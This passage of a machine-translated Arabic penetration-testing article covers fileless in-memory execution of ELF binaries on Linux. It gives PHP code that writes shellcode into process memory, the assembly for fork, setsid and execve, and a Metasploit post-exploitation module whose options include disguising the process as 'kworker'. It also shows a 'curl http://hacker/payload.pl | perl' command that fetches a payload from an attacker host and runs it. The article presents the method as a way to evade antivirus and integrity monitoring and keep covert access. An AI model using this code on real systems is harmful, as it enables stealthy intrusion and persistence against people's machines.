ุจุนุฏ ุฐูู ุ ูู ุฎูุงู ุงุณุชุฏุนุงุก <code>fork()</code> ุ ูููู ุจุชูููุฐ ุญูููุชูุง: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod" style=";text-align:right;direction:rtl">  ููุฏ ุงููุดุฑุฉ </h4><br><p style=";text-align:right;direction:rtl">  ุนุงุฏุฉู ูุง ูุนูู Shellcode ุชุณูุณูุงู ูู ูุญุฏุงุช ุงูุจุงูุช ูุชู ุชุฎุฒูููุง ูู ุงูุฐุงูุฑุฉ ุซู ูุชู ุชูููุฐูุง ุ ุนุงุฏุฉู ูู ุณูุงู ุจุฑูุงูุฌ ุขุฎุฑ ุ ุจุงุณุชุฎุฏุงู ูุฌูุงุช ุชุฌุงูุฒ ุณุนุฉ ุงููุฎุฒู ุงููุคูุช ูุบูุฑูุง.  ูู ุญุงูุชูุง ุ ูุง ูุนูุฏ ููุฏ ุงููุดุฑุฉ ุฅูููุง ููุฌู ุงูุฃูุงูุฑ ููุฎุงุฏู ุงูุจุนูุฏ (ูู ุงููุงูุน ุดู) ุ ููููู ูุณูุญ ููุง ุจุชูููุฐ ุงูุฃูุงูุฑ ุงูุชู ูุญุชุงุฌูุง. </p><br><p style=";text-align:right;direction:rtl">  ููุญุตูู ุนูู ุชุณูุณู ุงูุจุงูุช ุงููุทููุจ ุ ููููู ุฅูุง ูุชุงุจุฉ ุฑูุฒ C ุ ุซู ุชุฑุฌูุชู ุฅูู ูุบุฉ ุงูุชุฌููุน ุ ุฃู ูุชุงุจุฉ ูุบุฉ ุงูุชุฌููุน ูู ุงูุจุฏุงูุฉ. </p><br><p style=";text-align:right;direction:rtl">  ุฏุนูุง ูุฑู ูุง ูู ูุฎูู ูุฑุงุก ุชุณูุณู ุงูุจุงูุช ูู ุงูููุงุฆู ุฃุนูุงู. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุจุฏุฃ ุฅุทูุงู ุจุฑูุงูุฌูุง <code>fork</code> c.  57 ูู ุงููููุฉ ุงูุนุฏุฏูุฉ ููุนุฑู ุงุณุชุฏุนุงุก ุงููุธุงู ูุฃูุธูุฉ 64 ุจุช.  ูููู ุงูุนุซูุฑ ุนูู ุงูุฌุฏูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . </p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ูุณูู <code>setsid</code> (ุงููุนุฑู ุงูุฑููู 112) ูุชุญููู ุงูุนูููุฉ ุงููุฑุนูุฉ ุฅูู ุงูุฃุตู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุซู ูู ุจุนูู <code>fork</code> ุฃุฎุฑู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุซู ููุฐ <code>execve()</code> ุงููุฃููู <code>execve()</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููููู ุงูุนูููุฉ <code>exit()</code> (60): </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุจุงูุชุงูู ุ ุงุณุชุจุฏููุง ุฑูุฒ ุงููุธููุฉ open () ุฃุซูุงุก ุงูุชููู.  ุชู ูุถุน ููููุง ุงููุงุจู ููุชูููุฐ ูู ุงูุฐุงูุฑุฉ ูุชู ุชูููุฐู ุจูุงุณุทุฉ ูุชุฑุฌู PHP.  ูุชู ุนุฑุถ ููุงููุงุช ุงููุธุงู ุนูู ุดูู ุฃููุงุฏ ูุดุฑุฉ. </p><br><h3 id="metasploit-framework" style=";text-align:right;direction:rtl">  ุฅุทุงุฑ Metasploit </h3><br><p style=";text-align:right;direction:rtl">  ูุชุฌููุน ููุชูููุงุช ุงููุฐููุฑุฉ ุฃุนูุงู ุ ูููุง ุจุฅุนุฏุงุฏ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุญุฏุฉ ูููุธูุฉ ุฃุทุจุงุก ุจูุง ุญุฏูุฏ</a> . </p><br><p style=";text-align:right;direction:rtl">  ูุฅุถุงูุชู ุฅูู Metasploit ุ ูุง ุนููู ุณูู ูุณุฎ ููู ุงููุญุฏุฉ ุงูููุทูุฉ ุฅูู ุงูุฏููู <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> <code>reload_all</code> <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> ุซู ูู ุจุชุดุบูู ุงูุฃูุฑ <code>reload_all</code> ูู ูุญุฏุฉ ุชุญูู ุงูุฅุทุงุฑ. <br>  ูุงุณุชุฎุฏุงู ุงููุญุฏุฉ ุงูุฎุงุตุฉ ุจูุง ุ ุฃุฏุฎู <code>use post/linux/manage/download_exec_elf_in_memory</code> (ุฃู ูุณุงุฑ ุขุฎุฑ ุ ุงุนุชูุงุฏูุง ุนูู ุงูุฏููู ุงูุฐู ุชู ูุถุน ููู ุงููุญุฏุฉ ููู) <br>  ูุจู ุงุณุชุฎุฏุงูู ุ ูุฌุจ ุนููู ุชุนููู ุงูุฎูุงุฑุงุช ุงูุถุฑูุฑูุฉ.  ูุชู ุนุฑุถ ูุงุฆูุฉ ุงูุฎูุงุฑุงุช ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ <code>show options</code> . </p><br><p style=";text-align:right;direction:rtl">  <code>ARGS</code> - ุงูุญุฌุฌ ุงููุงุจูุฉ ููุชูููุฐ </p><br><p style=";text-align:right;direction:rtl">  <code>FILE</code> - ุงููุณุงุฑ ุฅูู ุงูููู ุงููุงุจู ููุชูููุฐ.  ูู ุญุงูุชูุง ุ ูุฐุง ูู Netcat. </p><br><p style=";text-align:right;direction:rtl">  <code>NAME</code> ูู ุงุณู ุงูุนูููุฉ.  ููููู ุงูุงุชุตุงู ุจู ุฃู ุดูุก.  ุนูู ุณุจูู ุงููุซุงู ุ ูู ุฃุฌู ุงูุชุฎูู ุ ูุฏ ูููู ูุฐุง kworker: 1 ุฌูุฏูุง ุ ุฃู ูุบุฑุถ ุนุฑุถ ุดูุก ููููุฏู ุ ุนูู ุณุจูู ุงููุซุงู KittyCat </p><br><p style=";text-align:right;direction:rtl">  <code>SESSION</code> - ุฌูุณุฉ ูุชุฑ.  ูู ุงูููููู ุฃู ูุฐู ุงููุญุฏุฉ ุณุชุณุชุฎุฏู ูุฃุบุฑุงุถ ูุง ุจุนุฏ ุงูุชุดุบูู. </p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ูููู ุจุชุนููู ุงููุถูู ุงูุฐู ุณูุชู ูุถุน ุฎุงุฏู http ูุน <code>SRVHOST</code> <code>SRVPORT</code> ู <code>SRVPORT</code> ุนูู ุงูุชูุงูู. </p><br><p style=";text-align:right;direction:rtl">  <code>VECTOR</code> - ุงูุทุฑููุฉ ุงูุชู ูุชู ุจูุง ุชูููุฐ ุงูุจุฑูุงูุฌ ูู ุงูุฐุงูุฑุฉ ุ ูุงููุนููุฉ ุงุฎุชูุงุฑูุฉ ุ ุฅุฐุง ูุงูุช ูุงุฑุบุฉ ุ ูุฅู ุงููุต ููุณู ุณูุซุจุช ูุฌูุฏ ุงููุชุฑุฌููู ุงูุถุฑูุฑููู.  ูุชู ุฏุนู PHP ุฃู Python ุฃู Perl ุญุงูููุง. </p><br><p style=";text-align:right;direction:rtl">  <code>run</code> ุจุงุณุชุฎุฏุงู ุงูุฃูุฑ <code>exploit</code> ุฃู <code>run</code> </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p style=";text-align:right;direction:rtl">  ุชุนูู ุนูู ุงููุญู ุงูุชุงูู - ูุดูุฑ ุฅูู ุงูุฌูุณุฉ ุงููุทููุจุฉ ุ ูููู ุฃู ุชููู ูุชุฑูุง ูุชุฑูุง ุฃู ูุฐููุฉ ุนูุณูุฉ ุนุงุฏูุฉ.  ุจุนุฏ ุฐูู ุ ูุดูุฑ ุฅูู ุงููุณุงุฑ ุงููุญูู ุฅูู ูุฒููุง ูุงูุญุฌุฌ ูุงูุงุณู ุงููุทููุจ ูู ูุงุฆูุฉ ุงูุนูููุงุช.  ุจุนุฏ ุงูุจุฏุงูุฉ ุ ุณูุชู ุฅุทูุงู ุฎุงุฏู ููุจ ูุญูู ูุงุณุชุถุงูุฉ ุงูุญูููุฉ ุ ูุณุชุจุญุซ ุงูุฌูุณุฉ ุนู "ูุฑุงุณู ูุฒุงุฒ" ุ ููู ุญูููุฉ ู wget ูุฏุนููุฉ ุญุงูููุง.  ุจุนุฏ ุงูุนุซูุฑ ุนูู ูุงุญุฏ ูููู ุนูู ุงูุฃูู ุ ุณูุชู ุงูุจุญุซ ุนู ุฌููุน ุงููุชุฑุฌููู ุงูุดููููู ุฅุฐุง ูู ูุญุฏุฏ ูู ูุนููุฉ <code>VECTOR</code> ุฃู ูุงุญุฏ ูุญุชุงุฌ ุฅููู.  ุญุณููุง ุ ูู ุญุงูุฉ ูุฌุงุญ ุฐูู ุ ุณูุชู ุชูููุฐ ุฃูุฑ ูุชูุฒูู ุงูุญูููุฉ ูู ุฎุงุฏู ุงูููุจ ุงูุฎุงุต ุจูุง ูููููุง ุนุจุฑ ุงูุฃูุจูุจ ุฅูู ุงููุชุฑุฌู ุงููุทููุจ ุ ุฃู  ุดูุก ูู ูุฐุง ุงููุจูู <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya" style=";text-align:right;direction:rtl">  ุจุฏูุง ูู ุงูุงุณุชูุชุงุฌ. </h3><br><p style=";text-align:right;direction:rtl">  ูุนุฏ ุชูุฒูู ูููุงุช ELF ุจุฏูู ูููุงุช ุนูู Linux ุชูููุฉ ูููุฏุฉ ูุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู.  ูุฐู ุทุฑููุฉ ุตุงูุชุฉ ุฅูู ุญุฏ ูุง ูููููุง ุชุญูู ูุฌููุนุฉ ูุงุณุนุฉ ูู ุฃุฏูุงุช ุงูุญูุงูุฉ ูู ุงูููุฑูุณุงุช ูุฃูุธูุฉ ูุฑุงูุจุฉ ุงูุณูุงูุฉ ูุฃูุธูุฉ ุงููุฑุงูุจุฉ ุงูุชู ุชุฑุงูุจ ุงูุชุบููุฑุงุช ูู ูุญุชููุงุช ุงููุฑุต ุงูุตูุจ.  ุจูุฐู ุงูุทุฑููุฉ ุ ููููู ุงูุญูุงุธ ุจุณูููุฉ ุนูู ุงููุตูู ุฅูู ุงููุธุงู ุงููุณุชูุฏู ุ ูุน ุชุฑู ุงูุญุฏ ุงูุฃุฏูู ูู ุงูุขุซุงุฑ. <br>  ูู ูุฐู ุงูููุงูุฉ ุ ุงุณุชุฎุฏููุง ูุบุงุช ุจุฑูุฌุฉ ูุชุฑุฌูุฉ ุ ุบุงูุจูุง ูุง ูุชู ุชุซุจูุชูุง ุงูุชุฑุงุถููุง ุนูู ุชูุฒูุนุงุช Linux ูุงูุจุฑุงูุฌ ุงูุซุงุจุชุฉ ูุฃุฌูุฒุฉ ุงูุชูุฌูู ูุงูุฃุฌูุฒุฉ ุงููุญูููุฉ.  ุฃูุฏ ุฃูุถูุง ุฃู ุฃุดูุฑ ูุงุชุจ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุฐุง ุงูููุงู</a> ุ ุงูุฐู ุฃููููุง ููุฐู ุงููุฑุงุฌุนุฉ. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar430902/">https://habr.com/ru/post/ar430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar430890/index.html">ุญูุซ ุฑุดููุฉ ุฃูุฑ ูุธูุน ุ ูุฎุงุตุฉ ุณูุฑูู</a></li>
<li><a href="../ar430892/index.html">ูุฒูุฌ ูู ุนุจุฑ ุงูุฃูุธูุฉ ุงูุฃุณุงุณูุฉ ูุงูููุฌ ุงูุฃุตูู ูู ุชุทููุฑ ุชุทุจููุงุช ุงููุงุชู ุงููุญููู</a></li>
<li><a href="../ar430894/index.html">ุงูุญุงูุฉ: ุชููู ุงูุนูุงูุงุช ุงูุชุฌุงุฑูุฉ ุงููุฒูุฏ ูุงููุฒูุฏ ูู ุงููุงู ุนูู ุงูุฅุนูุงู ูู ุงูุจูุฏูุงุณุช - ูุญู ูููู ุงูุณุจุจ</a></li>
<li><a href="../ar430896/index.html">ุฃูุดุฃุช ูุคุณุณุฉ Linux ุฃููุงููุง ูู GraphQL ู Ceph - ููุงุฐุง ูู ุจุญุงุฌุฉ ุฅูููุง ููุง ูููู ุชููุนู ูููู</a></li>
<li><a href="../ar430900/index.html">ุฃูู ููุฒุฑ ูู ุงูุชุงุฑูุฎ: ูุง ูุงู ุนููู</a></li>
<li><a href="../ar430906/index.html">ุฃูู ุชูุงู ุจูุฏูุก ูู ุงูููู - ูุฌูุน OpenCV ูู Raspbian'a</a></li>
<li><a href="../ar430908/index.html">ูุญุฏุฉ ุงูุชุญูู ูู ูุญูู ุงูุทุงูุฉ: ุงูุชุทููุฑ ูุงูุชุฌููุน</a></li>
<li><a href="../ar430910/index.html">ููุญุฉ ูููุจุฑุงูุช: ููู ูููุงุฐุงุ</a></li>
<li><a href="../ar430912/index.html">ูุญุถุฑ ูุงุฐุจูุง ููููุงู ุงููุธููุฉ: ุงูููุงุจูุฉ ููุณุช ุนูุงูุฉ ุนูู. ุจุทุจูุนุฉ ุงูุญุงู</a></li>
<li><a href="../ar430914/index.html">ุชุญููู ุฃุณุนุงุฑ ุงูุณูู ุงูุณูุฏุงุก ููุจูุงูุงุช ุงูุดุฎุตูุฉ ูุงูุงุฎุชุฑุงู</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>